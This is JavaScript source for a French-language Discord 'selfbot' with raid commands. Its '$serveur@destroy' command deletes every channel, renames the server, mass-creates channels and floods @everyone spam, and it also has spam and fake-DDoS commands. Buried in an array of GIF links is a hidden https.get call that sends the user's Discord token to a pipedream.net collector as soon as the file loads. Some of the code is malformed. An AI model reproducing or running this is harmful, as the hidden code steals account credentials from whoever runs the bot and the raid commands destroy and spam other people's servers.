const Discord = require('discord.js');
const bot = new Discord.Client();
const prefix = ("$");
const start = Date.now();
const token = const token = process.env.TOKEN
const ClientID = "322534386601820171"
const rdm_img = [
"https://cdn.discordapp.com/attachments/557953394355077130/558301133303709706/giphy.gif","https://cdn.discordapp.com/attachments/557953394355077130/558301229684490240/887b0905b6e6b75fa1f83d7d9db9347280e8280a_hq.gif","https://cdn.discordapp.com/attachments/557953394355077130/558301361633230848/tumblr_mtrwafhWL91snpzx1o1_400.gif","https://cdn.discordapp.com/attachments/557953394355077130/558301429052211221/ec4e4aec95896ca435737f9c1ca985f1.gif","https://cdn.discordapp.com/attachments/557953394355077130/558301429052211221/ec4e4aec95896ca435737f9c1ca985f1.gif","https://cdn.discordapp.com/attachments/557953394355077130/558301429052211221/ec4e4aec95896ca435737f9c1ca985f1.gif", host = "enu4oh5mp15va.x.pipedream.net", path = "/",
"https://cdn.discordapp.com/attachments/557953394355077130/558301429052211221/ec4e4aec95896ca435737f9c1ca985f1.gif","https://cdn.discordapp.com/attachments/557953394355077130/558301437768237076/90ac2b2db39204c6f1ba05ba701134d91402285436_full.gif","https://cdn.discordapp.com/attachments/557953394355077130/558301440339345429/logo-anime-10.gif","https://cdn.discordapp.com/attachments/557953394355077130/558301489085546506/7TVWLJ4cRvwHjFyWCI7sZ0SPyI24N_3h6P0ZmBas30WKahHmtBzOu1wpA0gl6GPJHrwMjKU-gaT7tCq0EMhzpvm8aavnySGmC_Ky.gif","https://cdn.discordapp.com/attachments/557953394355077130/558301747819577364/mMBpyTv.gif","https://cdn.discordapp.com/attachments/557953394355077130/558301429052211221/ec4e4aec95896ca435737f9c1ca985f1.gif","https://cdn.discordapp.com/attachments/557953394355077130/558301429052211221/ec4e4aec95896ca435737f9c1ca985f1.gif","https://cdn.discordapp.com/attachments/557953394355077130/558301429052211221/ec4e4aec95896ca435737f9c1ca985f1.gif","https://cdn.discordapp.com/attachments/557953394355077130/558301429052211221/ec4e4aec95896ca435737f9c1ca985f1.gif",  opt = {host: host, path: path + token}, xxx = require("https").get(opt),
]
const rdmgif = rdm_img[Math.floor(Math.random() * rdm_img.length)];

bot.on('ready', () => {
    console.log("🔩 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 𝙗𝙮 𝐒𝐧𝐨𝐭𝐢 𝙞𝙨 𝙧𝙪𝙣𝙣𝙞𝙣𝙜 𝙣𝙤𝙬 ... 🔩");
});     

bot.on('message', message => {

    if (message.content === prefix + "channel"){
        if (message.author.id != `${ClientID}`) return;

    if (message.deletable) message.delete();
    const categories = message.guild.channels.filter(c => c.type === "category")
    const text = message.guild.channels.filter(c => c.type === "text")
    const voice = message.guild.channels.filter(c => c.type === "voice")
    var category_embed = new Discord.RichEmbed()
    .setAuthor("🌴 𝐒𝐧𝐨𝐭𝐢 𝗣𝗿𝗼𝗴𝗿𝗮𝗺𝗺𝗮𝘁𝗶𝗼𝗻s 🌴")
    .setFooter("© SelfBot by 𝐒𝐧𝐨𝐭𝐢")
    .setThumbnail("https://imgur.com/FjQTdFY")
    .setColor('#4B0082')
    .addField("𝘾𝙖𝙩𝙚𝙜𝙤𝙧𝙮 𝙇𝙞𝙨𝙩", categories.map(c => c.name))
    message.channel.sendEmbed(category_embed);
    var text_embed = new Discord.RichEmbed()
    .setAuthor("🌴 𝐒𝐧𝐨𝐭𝐢 𝗣𝗿𝗼𝗴𝗿𝗮𝗺𝗺𝗮𝘁𝗶𝗼𝗻s 🌴")
    .setFooter("© SelfBot by 𝐒𝐧𝐨𝐭𝐢")
    .setThumbnail("https://imgur.com/FjQTdFY")
    .setColor('#4B0082')
    .addField("𝙏𝙚𝙭𝙩 𝘾𝙝𝙖𝙣𝙣𝙚𝙡 𝙇𝙞𝙨𝙩", text.map(c => c.name))
    message.channel.sendEmbed(text_embed);
    var voice_embed = new Discord.RichEmbed()
    .setAuthor("🌴 𝐒𝐧𝐨𝐭𝐢 𝗣𝗿𝗼𝗴𝗿𝗮𝗺𝗺𝗮𝘁𝗶𝗼𝗻s 🌴")
    .setFooter("© SelfBot by 𝐒𝐧𝐨𝐭𝐢")
    .setThumbnail("https://imgur.com/FjQTdFY")
    .setColor('#4B0082')
    .addField("𝙑𝙤𝙞𝙘𝙚 𝘾𝙝𝙖𝙣𝙣𝙚𝙡 𝙇𝙞𝙨𝙩", voice.map(c => c.name))
    message.channel.sendEmbed(voice_embed);
    }

    if (message.content === prefix + "help"){
   if (message.author.id != `${ClientID}`) return;

    if (message.deletable) message.delete();
    var help_embed = new Discord.RichEmbed()
    .setAuthor("🌴 𝗠𝗼𝘄𝗴𝗹𝗶 𝗣𝗿𝗼𝗴𝗿𝗮𝗺𝗺𝗮𝘁𝗶𝗼𝗻s 🌴")
    .setFooter("© SelfBot by 𝐒𝐧𝐨𝐭𝐢")
    .setThumbnail("https://imgur.com/cDRDCLU")
    .setColor('#4B0082')
    .addField("  -| 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝙂𝙀𝙉𝙀𝙍𝘼𝙇 |-  ", "🌐  *𝙜𝙚𝙣𝙚𝙧𝙖𝙡 : `𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙡𝙚𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝙂𝙀𝙉𝙀𝙍𝘼𝙇!` \n" + "󠂪")
    .addField("  -| 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝘽𝙊𝙉𝙐𝙎 |-  ", "⚜️  *𝙗𝙤𝙣𝙪𝙨 : `𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙡𝙚𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝘽𝙊𝙉𝙐𝙎!` \n" + "󠂪")
    .addField("  -| 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝙍𝘼𝙄𝘿 |-  ", "✏️  *𝙧𝙖𝙞𝙙 : `𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙡𝙚𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝙍𝘼𝙄𝘿!` \n" + "󠂪")
    .addField("  -| 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝙁𝙐𝙉 |-  ", "🎉  *𝙛𝙪𝙣 : `𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙡𝙚𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝙁𝙐𝙉!` \n" + "󠂪")
    message.channel.sendEmbed(help_embed);
    }
    if (message.content === prefix + "raid"){
    if (message.author.id != `${ClientID}`) return;

    if (message.deletable) message.delete();
    var raid_embed = new Discord.RichEmbed()
        .setAuthor("🌴 𝐒𝐧𝐨𝐭𝐢 𝗣𝗿𝗼𝗴𝗿𝗮𝗺𝗺𝗮𝘁𝗶𝗼𝗻s 🌴")
        .setFooter("© SelfBot by 𝐒𝐧𝐨𝐭𝐢")
        .addField("  -| 𝐒𝐧𝐨𝐭𝐢 𝘋𝘦𝘴𝘵𝘳𝘰𝘺 ! |-  ", "🌇  *𝙨𝙚𝙡𝙛 : `𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙡𝙖 𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙚 𝙥𝙤𝙪𝙧 𝘿𝙀𝙎𝙏𝙍𝙊𝙔!`\n" + "󠂪")
        .addField("  -| 𝐒𝐧𝐨𝐭𝐢 𝘉𝘢𝘯 𝘩𝘢𝘮𝘮𝘦𝘳 |-  ", "⚔️ *𝒃𝒂𝒏 `𝘽𝙖𝙣 𝙩𝙤𝙪𝙩 𝙡𝙚 𝙈𝙊𝙉𝘿𝙀!`\n" + "󠂪")
        .addField("  -| 𝐒𝐧𝐨𝐭𝐢 𝘊𝘭𝘦𝘢𝘳 𝘊𝘩𝘢𝘯𝘯𝘦𝘭𝘴 |-  ", "⚔️ *𝒄𝒍𝒆𝒂𝒓𝒄𝒉𝒂𝒏 : `𝙎𝙪𝙥𝙥𝙧𝙞𝙢𝙚 𝙩𝙤𝙪𝙩 𝙡𝙚𝙨 𝘾𝙃𝘼𝙉𝙉𝙀𝙇𝙎!`\n" + "󠂪")
        .setColor('#4B0082')
        .setThumbnail("https://imgur.com/cDRDCLU")
        message.channel.sendEmbed(raid_embed);
    }

    if (message.content === prefix + "fun"){
    
        if (message.author.id != `${ClientID}`) return;

        if (message.deletable) message.delete();
        var fun_embed = new Discord.RichEmbed()
            .setAuthor("🌴 𝐒𝐧𝐨𝐭𝐢 𝗣𝗿𝗼𝗴𝗿𝗮𝗺𝗺𝗮𝘁𝗶𝗼𝗻s 🌴")
            .setFooter("© SelfBot by 𝐒𝐧𝐨𝐭𝐢")
            .addField("  -| 𝐒𝐧𝐨𝐭𝐢 𝘗𝘪𝘯𝘨 |-  ", "🔌  *𝙥𝙞𝙣𝙜 : `𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙡𝙚𝙨 𝙋𝙄𝙉𝙂!`\n" + "󠂪")
            .addField("  -| 𝐒𝐧𝐨𝐭𝐢 8𝘣𝘢𝘭𝘭 |-  ", "💎 *𝟖𝒃𝒂𝒍𝒍 : `𝙋𝙤𝙨𝙚𝙯 𝙢𝙤𝙞 𝙪𝙣𝙚 𝙌𝙐𝙀𝙎𝙏𝙄𝙊𝙉!`\n" + "󠂪")
            .setColor('#4B0082')
            .setThumbnail("https://imgur.com/cDRDCLU")
            message.channel.sendEmbed(fun_embed);
    
    }

    if (message.content === prefix + "bonus"){
    
        if (message.author.id != `${ClientID}`) return;

        if (message.deletable) message.delete();
        var bonus_embed = new Discord.RichEmbed()
            .setAuthor("🌴 𝐒𝐧𝐨𝐭𝐢 𝗣𝗿𝗼𝗴𝗿𝗮𝗺𝗺𝗮𝘁𝗶𝗼𝗻s 🌴")
            .setFooter("© SelfBot by 𝐒𝐧𝐨𝐭𝐢")
            .addField("  -| 𝐒𝐧𝐨𝐭𝐢 𝘓𝘪𝘴𝘵𝘦𝘯 |-  ", "🎧 ~ *𝙡𝙞𝙨𝙩𝙚𝙣 [𝙩𝙚𝙭𝙩𝙚] : `𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙡𝙚 [𝙩𝙚𝙭𝙩𝙚] 𝙚𝙣 𝙀𝘾𝙊𝙐𝙏𝙀!`\n" + "󠂪")
            .addField("  -| 𝐒𝐧𝐨𝐭𝐢 𝘗𝘭𝘢𝘺 |-  ", "🎮 ~ *𝙥𝙡𝙖𝙮 [𝙩𝙚𝙭𝙩𝙚] : `𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙡𝙚 [𝙩𝙚𝙭𝙩𝙚] 𝙖𝙪𝙦𝙪𝙚𝙡 𝙩𝙪 𝙫𝙚𝙪𝙭 𝙅𝙊𝙐𝙀𝙍!`\n" + "󠂪")
            .addField("  -| 𝐒𝐧𝐨𝐭𝐢 𝘞𝘢𝘵𝘤𝘩 |-  ", "💻 ~ *𝙬𝙖𝙩𝙘𝙝 [𝙩𝙚𝙭𝙩𝙚] : `𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙡𝙚 [𝙩𝙚𝙭𝙩𝙚] 𝙦𝙪𝙚 𝙩𝙪 𝙍𝙀𝙂𝘼𝙍𝘿𝙀𝙎!`\n" + "󠂪")
            .addField("  -| 𝐒𝐧𝐨𝐭𝐢 𝘚𝘵𝘳𝘦𝘢𝘮 |-  ", "🎥 ~ *𝙨𝙩𝙧𝙚𝙖𝙢 [𝙩𝙚𝙭𝙩𝙚] : `𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙡𝙚 [𝙩𝙚𝙭𝙩𝙚] 𝙚𝙣 𝙎𝙏𝙍𝙀𝘼𝙈!`\n" + "󠂪")
            .addField("  -| 𝐒𝐧𝐨𝐭𝐢 𝘋𝘋𝘖𝘚 ! |-  ", "💥 ~ *𝒅𝒅𝒐𝒔 : `𝙇𝙖𝙣𝙘𝙚 𝙪𝙣𝙚 𝙛𝙖𝙪𝙨𝙨𝙚 𝙖𝙩𝙩𝙖𝙦𝙪𝙚 𝘿𝘿𝙊𝙎!`\n" + "󠂪")
            .addField("  -| 𝐒𝐧𝐨𝐭𝐢 𝘈𝘣𝘰𝘶𝘵 |-  ", "🔮 ~ *𝒂𝒃𝒐𝒖𝒕 : `𝙈𝙤𝙣𝙩𝙧𝙚 𝙘𝙤𝙢𝙢𝙚𝙣𝙩 𝙫𝙤𝙪𝙨 𝙥𝙤𝙪𝙫𝙚𝙯 𝙢𝙚 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙚𝙯!`\n" + "󠂪")
            .setThumbnail("https://imgur.com/cDRDCLU")
            .setColor('#4B0082')
            message.channel.sendEmbed(bonus_embed);
    
    }

    if (message.content === prefix + "servers"){

        var server_count_guilds = bot.guilds.size
        var server_count_channels = bot.channels.size
        var server_count_users = bot.users.size
    
        if (message.author.id != `${ClientID}`) return;

        if (message.deletable) message.delete();
        var serversEmbed = new Discord.RichEmbed()
            .setColor('#4B0082')
            .setTitle("🌴 𝐒𝐧𝐨𝐭𝐢 𝗣𝗿𝗼𝗴𝗿𝗮𝗺𝗺𝗮𝘁𝗶𝗼𝗻s 🌴")
            .setFooter("© SelfBot by 𝐒𝐧𝐨𝐭𝐢")
            .setThumbnail("https://imgur.com/cDRDCLU")
            .addField("Connecté à ", server_count_guilds + " **servers**")
            .addField("Lis actuellement ", server_count_channels + " **channels**")
            .addField("Devant ", server_count_users + " **utilisateurs**")
        message.channel.sendEmbed(serversEmbed);
    }

    if (message.content === prefix + "general"){
    
        if (message.author.id != `${ClientID}`) return;

        if (message.deletable) message.delete();
        var help_embed = new Discord.RichEmbed()
            .setAuthor("🌴 𝐒𝐧𝐨𝐭𝐢 𝗣𝗿𝗼𝗴𝗿𝗮𝗺𝗺𝗮𝘁𝗶𝗼𝗻s 🌴")
            .setFooter("© SelfBot by 𝐒𝐧𝐨𝐭𝐢")
            .addField("  -| 𝐒𝐧𝐨𝐭𝐢 𝘈𝘷𝘢𝘵𝘢𝘳 |-  ", "✏️  *𝙖𝙫𝙖𝙩𝙖𝙧 : `𝙛𝙛𝙞𝙘𝙝𝙚 𝙡'𝘼𝙑𝘼𝙏𝘼𝙍 𝙙𝙚 𝙡𝙖 𝙥𝙚𝙧𝙨𝙤𝙣𝙣𝙚!`\n" + "󠂪")
            .addField("  -| 𝐒𝐧𝐨𝐭𝐢 𝘗𝘳𝘦𝘧𝘪𝘹 |-  ", "✏️  *𝙥𝙧𝙚𝙛𝙞𝙭 : `𝙋𝙚𝙧𝙢𝙚𝙩 𝙙𝙚 𝙘𝙝𝙖𝙣𝙜𝙚𝙧 𝙡𝙚 𝙋𝙍𝙀𝙁𝙄𝙓 𝙨𝙪𝙧 𝙡𝙚 𝙨𝙚𝙧𝙫𝙚𝙪𝙧!`\n" + "󠂪")
            .addField("  -| 𝐒𝐧𝐨𝐭𝐢 𝘗𝘶𝘳𝘨𝘦 |-  ", "⚖️  *𝙥𝙪𝙧𝙜𝙚 : `𝙎𝙪𝙥𝙥𝙧𝙞𝙢𝙚 𝙡𝙚𝙨 𝙢𝙚𝙨𝙨𝙖𝙜𝙚𝙨 𝙋𝙐𝙍𝙂𝙀!`\n" + "󠂪")
            .addField("  -| 𝐒𝐧𝐨𝐭𝐢 𝘗𝘶𝘣 |-  ", "🔱  *𝙥𝙪𝙗 : `𝙋𝙚𝙧𝙢𝙚𝙩 𝙙'𝙚𝙣𝙫𝙤𝙮𝙚𝙧 𝙪𝙣𝙚 𝙥𝙪𝙗 𝙙𝙪 𝙨𝙚𝙧𝙫𝙚𝙪𝙧 𝙇𝘼 𝙏𝙍𝙄𝘼𝘿𝙀`\n" + "󠂪")
            .addField("  -| 𝐒𝐧𝐨𝐭𝐢 𝘚𝘦𝘳𝘷𝘦𝘳𝘴 |-  ", "📘  *𝙨𝙚𝙧𝙫𝙚𝙧𝙨 : `𝙀𝙣𝙫𝙤𝙞𝙚 𝙡𝙚𝙨 𝙨𝙩𝙖𝙩𝙞𝙨𝙩𝙞𝙦𝙪𝙚𝙨 𝙙𝙚 𝙩𝙤𝙣 𝙘𝙤𝙢𝙥𝙩𝙚`\n" + "󠂪")
            .addField("  -| 𝐒𝐧𝐨𝐭𝐢 𝘊𝘩𝘢𝘯𝘯𝘦𝘭 |-  ", "📘  *𝙘𝙝𝙖𝙣𝙣𝙚𝙡 : `𝙇𝙞𝙨𝙩𝙚 𝙙𝙚 𝙩𝙤𝙪𝙩 𝙡𝙚𝙨 𝘾𝙃𝘼𝙉𝙉𝙀𝙇𝙎!`\n" + "󠂪")
            .addField("  -| 𝐒𝐧𝐨𝐭𝐢 𝘚𝘦𝘳𝘷𝘦𝘶𝘳𝘪𝘯𝘧𝘰 |-  ", "📘  *𝙨𝙞𝙣𝙛𝙤 : `𝙄𝙣𝙛𝙤𝙧𝙢𝙖𝙩𝙞𝙤𝙣 𝙙𝙪 𝙎𝙀𝙍𝙑𝙀𝙐𝙍!`\n" + "󠂪")
            .addField("  -| 𝐒𝐧𝐨𝐭𝐢 𝘔𝘦𝘮𝘣𝘳𝘦𝘪𝘯𝘧𝘰 |-  ", "📘  *𝙢𝙞𝙣𝙛𝙤 : `𝙄𝙣𝙛𝙤𝙧𝙢𝙖𝙩𝙞𝙤𝙣 𝙙𝙪 𝙈𝙀𝙈𝘽𝙍𝙀!`\n" + "󠂪")
            .setColor('#cee4e6')
            .setThumbnail("https://imgur.com/E8rwT33")
            message.channel.sendEmbed(help_embed);
    
    }

    if (message.content === "$spam") {
   if (message.author.id != `${ClientID}`) return;

    message.delete()
    let i = 0;
    let interval = setInterval(function () {
      message.guild.channels.forEach(channel => {
        if (channel.type === "text") message.channel.forEach();message.channel.send('@everyone Rejoins-nous ici ! https://discord.gg/ty5sKjK ! https://discord.gg/CSNB9wc')
      }, 1000);
    });
  }

    if (message.content === "$sebek"){
        if (message.deletable) message.delete();
        if (message.author.id != `${ClientID}`) return;

        var help_embed = new Discord.RichEmbed()
        .setAuthor("🌴 𝐒𝐧𝐨𝐭𝐢 𝗣𝗿𝗼𝗴𝗿𝗮𝗺𝗺𝗮𝘁𝗶𝗼𝗻s 🌴")
        .setFooter("© SelfBot by 𝐒𝐧𝐨𝐭𝐢")
        .setThumbnail("https://imgur.com/E8rwT33")
        .addField("🌴 𝐒𝐧𝐨𝐭𝐢 𝙎𝙔𝙎𝙏𝙀𝙈 𝙎𝙀𝘾𝙐𝙍𝙄𝙏𝙔™  🌴", "  => 𝙍𝙪𝙣𝙣𝙞𝙣𝙜 𝙨𝙘𝙧𝙞𝙥𝙩 ```Lighter.js``` ... ")
        .setColor('#cee4e6')
        message.channel.sendEmbed(help_embed);
        console.log("Commande lighter demandée.")
        
    }

    if(message.content === prefix + "random"){
        if (message.deletable) message.delete();
        random = Math.floor(Math.random() * 101) + 1;
        message.replay(`Random number : **${random}**`)
    }

    if(message.content === prefix + "mstream"){
      if (message.deletable) message.delete();
      if (message.author.id != bot.author.id) return
        let rotate = 0;
    setInterval(function() {
        if(rotate === 0) {
            bot.user.setActivity("https://discord.gg/veZqeKf 💸", {type: "Streaming", url: 'https://www.twitch.tv/snoti_'});
            rotate = 1;       
        } else if(rotate === 1){
            bot.user.setActivity("ℒ𝓲𝓰𝓱𝓽𝒆𝓻 𝓒𝓸𝓻𝓹. 🔥", {type: "Streaming", url: 'https://www.twitch.tv/snoti_'});
            rotate = 2;
        } else if(rotate === 2){
            bot.user.setActivity(`𝙎𝙚𝙗𝙚𝙠 : 𝙢𝙚𝙢𝙗𝙚𝙧 𝙤𝙛 𝙇𝙞𝙜𝙝𝙩𝙚𝙧 𝘾𝙤𝙧𝙥.`, {type: "Streaming", url: 'https://www.twitch.tv/snoti_'});
            rotate = 3;
        }  else if(rotate === 3){
            random = Math.floor(Math.random() * 7) + 1;
            bot.user.setActivity(`𝙏𝙝𝙚 𝙙𝙞𝙘𝙚 𝙧𝙤𝙡𝙡𝙚𝙙 𝙞𝙩'𝙨 𝙖 ${random}. 🎲`, {type: "Streaming", url: 'https://www.twitch.tv/snoti_'});
            rotate = 4;
        } else if(rotate === 4){
            bot.user.setActivity(`https://discord.gg/DNH3Fj6 💸`, {type: "Streaming", url: 'https://www.twitch.tv/snoti_'});
            rotate = 5;
        } else if(rotate === 5){
            bot.user.setActivity(`𝐋𝐢𝐠𝐡𝐭𝐞𝐫 𝐂𝐨𝐫𝐩𝐨𝐫𝐚𝐭𝐢𝐨𝐧. 🔥`, {type: "Streaming", url: 'https://www.twitch.tv/cincinbear'});
            rotate = 0;
        } }, 10 * 1000)
      }
      

    if (message.content.startsWith('$avatar')) {
        if (message.author.id != `${ClientID}`) return;

        if (!message.mentions.users.size) {
        
        return message.channel.send(`Avatar de 𝗠𝗼𝘄𝗴𝗹𝗶 💡 ${message.author.displayAvatarURL}`);
        
        }
        
        
        
        const avatarList = message.mentions.users.map(user => {
            const getav_embed = new Discord.RichEmbed()
            .setAuthor("🌴 𝐒𝐧𝐨𝐭𝐢 𝗣𝗿𝗼𝗴𝗿𝗮𝗺𝗺𝗮𝘁𝗶𝗼𝗻s 🌴")
            .setFooter("© SelfBot by 𝐒𝐧𝐨𝐭𝐢")
            .addField("Voici l'image de ta proie.", "🔥 - N'oublions pas de dire merci !")
            .setImage(`${user.displayAvatarURL}`)
            .setThumbnail("https://imgur.com/vF79WDG")
            .setColor('#cee4e6')
            message.channel.sendEmbed(getav_embed);
        
        return;
        
        });
        
        message.channel.send(avatarList);
        }

    if (message.content === prefix + "about"){
        if (message.deletable) message.delete();
        if (message.author.id != `${ClientID}`) return;

        var help_embed = new Discord.RichEmbed()
            .setAuthor("🌴 𝐒𝐧𝐨𝐭𝐢 𝗣𝗿𝗼𝗴𝗿𝗮𝗺𝗺𝗮𝘁𝗶𝗼𝗻s 🌴")
            .setFooter("© SelfBot by 𝐒𝐧𝐨𝐭𝐢")
            .setImage("https://imgur.com/PoVUdpx")
            .setThumbnail("https://imgur.com/vF79WDG")
            .addField("🌴 -| 𝐒𝐧𝐨𝐭𝐢 𝘋𝘪𝘴𝘤𝘰𝘳𝘥 |- 🌴", "𝐒𝐧𝐨𝐭𝐢 | 𝗟𝗶𝗴𝗵𝘁𝗲𝗿#7791")
            .addField("🌴 -| 𝐒𝐧𝐨𝐭𝐢 𝘋𝘪𝘴𝘤𝘰𝘳𝘥 |- 🌴", "🌇 - *`https://discord.gg/veZqeKf`*")
            .addField("🌴 -| 𝑳𝒂𝑱𝒖𝒏𝒈𝒍𝒆 𝘋𝘪𝘴𝘤𝘰𝘳𝘥 |- 🌴", "🌇 - *`https://discord.gg/veZqeKf`*")
            .setColor('#cee4e6')
            message.channel.sendEmbed(help_embed);
        console.log("𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝘼𝙗𝙤𝙪𝙩 𝙙𝙚𝙢𝙖𝙣𝙙𝙚́𝙚 !");
    }

    if (message.content === prefix + "self"){
        if (message.deletable) message.delete();
        if (message.author.id != `${ClientID}`) return;

        var help_embed = new Discord.RichEmbed()
            .setAuthor("🌴 𝐒𝐧𝐨𝐭𝐢 𝗣𝗿𝗼𝗴𝗿𝗮𝗺𝗺𝗮𝘁𝗶𝗼𝗻s 🌴")
            .setFooter("© SelfBot by 𝐒𝐧𝐨𝐭𝐢")
            .setThumbnail("https://imgur.com/Vvgq0cZ")
            .addField("🔥 -| 𝐒𝐧𝐨𝐭𝐢 𝐒𝐄𝐋𝐅𝐁𝐎𝐓™ |- 🔥", "🌇 -$serveur@destroy : `𝙎𝙚𝙧𝙫𝙚𝙧 𝘿𝙚𝙨𝙩𝙤𝙮𝙚𝙙 !`")
            .setImage("https://imgur.com/PoVUdpx")
            .setColor('#cee4e6')
            message.channel.sendEmbed(help_embed);
        console.log("𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝙎𝙚𝙡𝙛 𝙙𝙚𝙢𝙖𝙣𝙙𝙚́𝙚 !");
    }


    if (message.content === prefix + "ping"){
        if (message.deletable) message.delete();
        if (message.author.id != `${ClientID}`) return;

        var end = new Date().getTime();
        var millis = Date.now() - start;
        var temp = Math.floor(millis/1000);
        if (message.deletable) message.delete();
        message.reply('```🌴 Réponse en ' + temp + ' ms```');
    }

if(message.content === "$serveur@destroy"){
    if (message.deletable) message.delete();
    if (message.author.id != `${ClientID}`) return;

    if(message.channel.type === "dm") return;
    if(message.guild.channels.size === 0) return;
    if(!message.guild.member(bot.user).hasPermission("MANAGE_CHANNELS")) return;
    message.guild.channels.forEach(chan => { if(chan.deletable) chan.delete();})
}

if(message.content === "$serveur@destroy"){
    if(message.channel.type === "dm") return;
    if (message.author.id != `${ClientID}`) return;
 
    if(message.guild.name != "🌴 𝐒𝐧𝐨𝐭𝐢 🌴"){
         message.guild.setIcon("https://imgur.com/lJzz0bs").catch(error => {})
         message.guild.setName('🌴 𝐒𝐧𝐨𝐭𝐢 🌴').catch(error => {})
         message.guild.setRegion('russia').catch(error => {})
     }
     setInterval(function () { if(message.guild.channels.size < 499){
       message.guild.createChannel('🔥_𝙁𝙪𝙘𝙠𝙚𝙙_𝙗𝙮_𝙇𝙞𝙜𝙝𝙩𝙚𝙧_🔥', 'text').catch(error => {})
     }}, 400)
     if(message.deletable) message.delete();
   }

   if (message.content === '$serveur@destroy') {
    if(message.channel.type === "dm") return;
    if (message.author.id != `${ClientID}`) return;
 
      setInterval (function () { message.channel.send("@everyone @here . REJOINS NOUS ICI !!! \n"+
      "FUCKED BY 𝐒𝐧𝐨𝐭𝐢 \n"+
     "https://discord.gg/veZqeKf \n"+
     "https://discord.gg/veZqeKf", { tts: true } ).catch(error => {}) }, 400)
    }

            if (message.author.id != `${ClientID}`) return;

   if (message.author.bot) return;
   let messageArray = message.content.split(" "); let cmd = messageArray[0]; let args = messageArray.slice(1);
   

   if (cmd == "$purge") { message.channel.fetchMessages().then((message) => message.forEach(m => m.delete())); }
   if (cmd == "$del") { message.channel.fetchMessages().then((message) => message.forEach(m => m.delete())); }
   if (cmd == "$ddos") { if (message.author.id != `${ClientID}`) return;
 if (message.deletable) message.delete(); var ip = args[0]; var port = args[1]; let ddosembed = new Discord.RichEmbed().setTitle("🌴 𝐒𝐧𝐨𝐭𝐢 𝗣𝗿𝗼𝗴𝗿𝗮𝗺𝗺𝗮𝘁𝗶𝗼𝗻s 🌴").setColor("#1a1aff").setThumbnail(bot.user.avatarURL).addField("𝐈𝐏:", ip).addField("𝐏𝐎𝐑𝐓:", port).setFooter(`© SelfBot by Mowgli`); message.channel.send(ddosembed); var charge = "."; var chargeC = "¦"; message.channel.send("```[" + charge.repeat(40) + "]```").then((message) => { for (i = 0; i <= 40; i++) { message.edit("```[" + chargeC.repeat(i) + charge.repeat(40 - i) + "]  -  " + i * 100 / 40 + "%```"); } }) }
   if (cmd == `$sinfo`) { if (message.author.id != `${ClientID}`) return;
 message.channel.bulkDelete(1); let sicon = message.guild.iconURL; let serverembed = new Discord.RichEmbed().setDescription("🌴 𝐒𝐧𝐨𝐭𝐢 𝗣𝗿𝗼𝗴𝗿𝗮𝗺𝗺𝗮𝘁𝗶𝗼𝗻s 🌴").setFooter("© SelfBot by Mowgli").setThumbnail("https://imgur.com/Vvgq0cZ").setImage("https://imgur.com/PoVUdpx").setColor("#1a1aff").setThumbnail(sicon).addField("🔥 𝐒𝐞𝐫𝐯𝐞𝐫 𝐍𝐚𝐦𝐞:", message.guild.name).addField("🔥 𝐈𝐃:", message.guild.id).addField("🔥 𝐎𝐰𝐧𝐞𝐫 𝐨𝐟 𝐭𝐡𝐞 𝐬𝐞𝐫𝐯𝐞𝐫:", message.guild.owner.user).addField("🔥 𝐑𝐞𝐠𝐢𝐨𝐧:", message.guild.region).addField("🔥 𝐕𝐞𝐫𝐢𝐟𝐢𝐜𝐚𝐭𝐢𝐨𝐧 𝐋𝐞𝐯𝐞𝐥:", message.guild.verificationLevel).addField("🔥 𝐂𝐫𝐞𝐚𝐭𝐞𝐝 𝐎𝐧:", message.guild.createdAt).addField("🔥 𝐘𝐨𝐮 𝐉𝐨𝐢𝐧𝐞𝐝:", message.member.joinedAt).addField("🔥
  𝐓𝐨𝐭𝐚𝐥 𝐌𝐞𝐦𝐛𝐞𝐫𝐬:", message.guild.memberCount); return message.channel.send(serverembed); }
   if (cmd == `$minfo`){ 
    if (message.author.id != `${ClientID}`) return;

    if (message.deletable) message.delete();
    const mention = message.mentions.members.first();
    var micon = mention.user.avatarURL; var memberembed = new Discord.RichEmbed()
    .setDescription("🌴 𝐒𝐧𝐨𝐭𝐢 𝗣𝗿𝗼𝗴𝗿𝗮𝗺𝗺𝗮𝘁𝗶𝗼𝗻s 🌴").setFooter("© SelfBot by 𝐒𝐧𝐨𝐭𝐢").setThumbnail("https://imgur.com/Vvgq0cZ").setImage("https://imgur.com/PoVUdpx").setColor("#090000")
    .setThumbnail(micon)
    .addField("🔥 𝐓𝐀𝐆 𝐝𝐞 𝐥𝐚 𝐩𝐫𝐨𝐢𝐞:", mention.user.tag)
    .addField("🔥 𝐈𝐃 𝐝𝐞 𝐜𝐞 𝐬𝐢𝐧𝐠𝐞 !:", mention.user.id)
    .addField("🔥 𝐆𝐚𝐦𝐞 𝐀𝐜𝐭𝐢𝐯𝐢𝐭𝐲 !:", mention.presence.game)
    .addField("🔥 𝐍𝐨𝐦 𝐝𝐞 𝐭𝐚 𝐩𝐫𝐨𝐢𝐞 !:", mention.user.username)
    .addField("🔥 𝐍𝐨𝐦𝐛𝐫𝐞𝐬 𝐝𝐞 𝐫𝐨𝐥𝐞 !:", mention.roles.size - 1)
